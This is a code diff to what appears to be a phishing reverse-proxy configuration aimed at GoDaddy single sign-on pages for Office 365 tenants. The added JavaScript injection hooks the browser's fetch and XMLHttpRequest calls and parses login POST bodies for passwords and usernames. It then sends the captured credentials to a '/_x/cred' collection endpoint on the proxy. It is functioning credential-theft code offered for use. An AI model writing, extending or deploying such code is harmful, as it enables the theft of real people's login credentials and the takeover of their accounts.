@@ -323,6 +323,8 @@ js_inject:
 
   # GoDaddy SSO — WS-Fed puts username= in URL; page shows password field only.
   # Autofill email if present, keep retrying until input appears (React SPA).
+  # Also intercepts fetch/XHR to capture the password since there is no
+  # x-tymus session cookie on this subdomain (session was set on Microsoft proxy).
   # sso.secureserver.net is used for custom-domain GoDaddy O365 tenants.
   - trigger_domains: ["sso.godaddy.com", "sso.secureserver.net"]
     trigger_paths: ["/*"]
@@ -333,8 +335,66 @@ js_inject:
         var hash   = window.location.hash.slice(1);
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
 
+        // --- credential capture via fetch/XHR intercept ---
+        function _extractCred(bodyStr) {
+          try {
+            var obj = JSON.parse(bodyStr);
+            var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || obj.userPassword || obj.login_password || '';
+            var user = obj.username || obj.email || obj.login || obj.user || '';
+            if (pass) return {p: pass, u: user};
+          } catch(e) {}
+          // form-encoded fallback
+          try {
+            var parts = bodyStr.split('&');
+            var p = '', u = '';
+            for (var i = 0; i < parts.length; i++) {
+              var kv = parts[i].split('=');
+              var k = decodeURIComponent(kv[0] || '');
+              var v = decodeURIComponent(kv[1] || '');
+              if (/^(password|passwd|pass|pwd|credential|secret|userPassword|login_password)$/i.test(k)) p = v;
+              if (/^(username|email|login|user)$/i.test(k)) u = v;
+            }
+            if (p) return {p: p, u: u};
+          } catch(e) {}
+          return null;
+        }
+        function _sendCred(cred) {
+          try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '/_x/cred', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify(cred));
+          } catch(e) {}
+        }
+        // Patch fetch
+        var _oFetch = window.fetch;
+        window.fetch = function(url, opts) {
+          if (opts && opts.method && opts.method.toUpperCase() === 'POST' && opts.body) {
+            var bodyStr = typeof opts.body === 'string' ? opts.body : '';
+            if (!bodyStr && opts.body instanceof URLSearchParams) bodyStr = opts.body.toString();
+            var cred = _extractCred(bodyStr);
+            if (cred) _sendCred(cred);
+          }
+          return _oFetch.apply(this, arguments);
+        };
+        // Patch XHR
+        var _oOpen = XMLHttpRequest.prototype.open;
+        var _oSend = XMLHttpRequest.prototype.send;
+        XMLHttpRequest.prototype.open = function(method, url) {
+          this._xm = method; this._xu = url;
+          return _oOpen.apply(this, arguments);
+        };
+        XMLHttpRequest.prototype.send = function(body) {
+          if (this._xm && this._xm.toUpperCase() === 'POST' && body) {
+            var bodyStr = typeof body === 'string' ? body : (body instanceof URLSearchParams ? body.toString() : '');
+            var cred = _extractCred(bodyStr);
+            if (cred) _sendCred(cred);
+          }
+          return _oSend.apply(this, arguments);
+        };
+
+        // --- email autofill ---
         function fill() {
-          // Try email/username fields first (some flows show both)
           var emailSels = ['input[name="email"]','input[name="username"]','input[name="login"]','input[type="email"]'];
           for (var i = 0; i < emailSels.length; i++) {
             var el = document.querySelector(emailSels[i]);
@@ -345,7 +405,6 @@ js_inject:
               break;
             }
           }
-          // Keep retrying until a visible input exists on the page
           var any = document.querySelector('input[type="password"], input[name="email"], input[name="username"], input[type="email"], input[type="text"]');
           if (!any) { setTimeout(fill, 400); }
         }
